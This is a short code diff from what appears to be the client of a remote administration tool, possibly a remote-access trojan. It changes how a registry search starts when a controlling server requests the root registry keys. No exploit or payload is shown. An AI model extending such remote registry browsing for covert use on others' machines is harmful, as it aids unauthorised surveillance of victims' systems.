@@ -45,7 +45,7 @@ namespace xClient.Core.Commands
                 // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
                 if (packet.RootKeyName == null)
                 {
-                    seeker.Start(new RegistrySeekerParams(null, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values));
+                    seeker.Start(new RegistrySeekerParams(null));
                 }
                 else
                 {
